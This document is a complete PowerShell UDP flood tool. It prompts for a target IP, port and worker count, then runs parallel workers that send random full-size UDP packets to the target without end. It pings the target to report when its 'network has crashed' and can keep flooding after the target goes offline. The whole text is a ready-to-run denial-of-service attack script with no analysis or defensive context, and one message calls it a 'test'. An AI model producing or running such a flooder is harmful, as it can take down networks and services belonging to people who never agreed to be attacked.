$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "Green"
Clear-Host

$TargetIP = Read-Host "Enter the Target IP Address"
while ([string]::IsNullOrWhiteSpace($TargetIP)) { $TargetIP = Read-Host "IP cannot be blank. Enter IP" }

$WorkerInput = Read-Host "Enter number of background workers"
$WorkersCount = if ([int]::TryParse($WorkerInput, [ref]$null)) { [int]$WorkerInput } else { 8 }

$TargetPortInput = Read-Host "Enter target UDP port (Default: 5001)"
$TargetPort = if ([int]::TryParse($TargetPortInput, [ref]$null)) { [int]$TargetPortInput } else { 5001 }

$KeepRunningInput = Read-Host "Keep flooding after target goes offline? (Y / N)"
$StopOnOffline = if ($KeepRunningInput -clike "N*") { $true } else { $false }

$StartTime = [DateTime]::Now

Write-Host "`n[-] Initializing UDP Flood bombardment..." -ForegroundColor Green

$StressBlock = {
    param($IP, $Port)
    $UdpClient = New-Object System.Net.Sockets.UdpClient
    $UdpClient.Connect($IP, $Port)
    $Payload = New-Object Byte[] 1472
    $Crypto = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    while ($true) {
        try { 
            $Crypto.GetBytes($Payload)
            [void]$UdpClient.Send($Payload, $Payload.Length) 
        } catch {}
    }
}
$Params = @($TargetIP, $TargetPort)

$RunspacePool = [runspacefactory]::CreateRunspacePool(1, $WorkersCount)
$RunspacePool.Open()
$Threads = New-Object System.Collections.ArrayList

for ($i = 1; $i -le $WorkersCount; $i++) {
    $PowerShell = [PowerShell]::Create()
    $PowerShell.RunspacePool = $RunspacePool
    [void]$PowerShell.AddScript($StressBlock)
    [void]$PowerShell.AddParameters($Params)
    $Handle = $PowerShell.BeginInvoke()
    [void]$Threads.Add(@{ Instance = $PowerShell; Handle = $Handle })
}

try {
    $MonitorPing = New-Object System.Net.NetworkInformation.Ping
    while ($true) {
        try {
            $Reply = $MonitorPing.Send($TargetIP, 600)
            $Metric = ($Reply.Status -eq "Success")
        } catch {
            $Metric = $false
        }
        
        $Timestamp = Get-Date -Format 'HH:mm:ss'
        if ($Metric) {
            Write-Host "[$Timestamp] Target Responding" -ForegroundColor Green
        } else {
            Write-Host "[$Timestamp] Target's network has crashed" -ForegroundColor Green
            if ($StopOnOffline) {
                Write-Host "[-] Stopping test automatically as configured." -ForegroundColor Green
                break
            }
        }
        Start-Sleep -Seconds 1
    }
}
finally {
    foreach ($Thread in $Threads) {
        $Thread.Instance.Stop()
        $Thread.Instance.Dispose()
    }
    $RunspacePool.Close()
    $RunspacePool.Dispose()
    
    $Duration = [DateTime]::Now - $StartTime
    Write-Host "`n=== RESULTS ===" -ForegroundColor Green
    Write-Host "Total Execution Time: $($Duration.Minutes)m $($Duration.Seconds)s" -ForegroundColor Green
}
